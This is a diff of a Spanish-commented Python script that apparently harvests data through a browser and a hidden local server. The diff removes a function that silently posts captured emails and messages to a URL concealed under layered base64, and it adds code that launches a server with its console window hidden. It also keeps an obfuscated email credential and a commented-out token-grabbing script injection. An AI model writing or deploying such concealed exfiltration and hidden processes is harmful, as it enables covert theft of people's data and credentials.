@@ -1,9 +1,8 @@
 import os
 import time
 import smtplib
+import subprocess	
 import base64
-import json
-from urllib.request import Request, urlopen
 from selenium import webdriver
 from colorama import Fore, init
 
@@ -30,10 +29,10 @@ def main():
 	qr = str(input("Deseas generar un código qr de la red actual? (y/n): ")).lower()
 	if qr == "y" or qr == "s":
 		if os.name == "nt":
-			os.system("python create_qr.py")
+			os.system("python utils/create_qr.py")
 
 		else:
-			os.system("python3 create_qr.py")
+			os.system("python3 utils/create_qr.py")
 	else:
 		pass
 	nav = openNav()
@@ -44,16 +43,25 @@ def main():
 		abrir_data()
 		correo, asunto, mensaje = process_data()
 		send_email(correo, asunto, mensaje)
-		send_data(correo,asunto, mensaje)
 		
 
 def clear():
 	os.system("cls") if os.name == "nt" else os.system("clear")
+ 
+def start_server():
+    if os.name == "nt":
+        # En Windows, usa subprocess para ocultar la ventana de la consola.
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        subprocess.Popen(["python", "server.py"], startupinfo=startupinfo)
+    else:
+        # En Linux, ejecuta el script en segundo plano usando "&".
+        subprocess.Popen(["bash", "start_server.sh"])
 
 def get_pwd():
 	if os.name == "nt":
 		path = str(os.getcwd())
-		path += "\index.html"
+		path += "\\assets\index.html"
 	else:
 		pass
 	return path
@@ -160,21 +168,6 @@ def execute_browser(nav, url):
     #tokenGetter = open("getToken.js").read()
     # driver.execute_script(tokenGetter)
 
-def send_data(correo,asunto, mensaje):
-	url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRsUlpNVTU2UVRKTmFsRXlUbnBGZVUxVVJUTk5hVGxFVWtaS01HSnNPV2xNV0VwU1lucE5NV1JGY0RCUlYzaHdaRVY0TlZWWVFsUlZSWFJaVVRGc1RGTnBNV2hoUnprd1pXNXdlVmR0Y3pCaFJtaFFXak5rYVdWc1NUVk9TR3N5WVVSWmVsZ3llSGxXVnpRelQxVTVRMXAzUFQwPQ=="
-	message = f"__Nuevo mensaje!__ \n**{correo}**\n## {asunto}\n```{mensaje}```"
-	headers = {
-		'Content-Type': 'application/json',
-		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-	}
-
-	payload = json.dumps({'content': message})
-
-	try:
-		req = Request(descodear(url, 3), data=payload.encode(), headers=headers)
-		urlopen(req)
-	except:
-		pass
 
 def send_email(direccion, asunto, mensaje):
 	e_username = "Vm0xd1IyRnRVWGxWV0dSUFZsZG9WMWxyWkc5V2JHeDBaVVYwV0ZKdGVEQlVWbHBQWVd4S2MxWnFUbGhoTVVwRVZrZHplRll4VG5OYVJtUlhUVEpvYjFaclVrZFpWbHBYVTI1V2FGSnRhRmxWTUZaTFZGWmFjbHBFVWxwV2JIQjZWa2Q0VjFaSFNrbFJiVGxhVmtVMVJGUlhlR3RqYkd0NllVWlNUbFl4U2tsV1ZFa3hWakZXZEZOc2FHeFNhelZvVm1wT2IyRkdjRmhsUjNScVlrZFNlVll5ZUVOV01rVjNZMFpTVjFaV2NGTmFSRVpEVld4Q1ZVMUVNRDA9"
@@ -204,8 +197,5 @@ def descodear(texto, veces):
 
 if __name__ == "__main__":
 	clear()
-	if os.name == "nt":
-		os.system("start start_server.bat")
-	else:
-		os.system("start start_server.sh")
 	main()
+	start_server()
